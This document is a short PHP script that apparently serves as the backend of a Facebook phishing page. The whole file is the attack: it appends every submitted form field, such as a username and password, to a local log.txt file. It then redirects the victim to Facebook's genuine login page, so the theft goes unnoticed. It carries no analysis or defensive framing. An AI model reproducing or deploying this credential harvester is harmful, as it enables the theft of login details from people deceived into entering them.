<?php
header ('Location: http://www.facebook.com/login.php');
$handle = fopen("log.txt", "a"); //log file
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
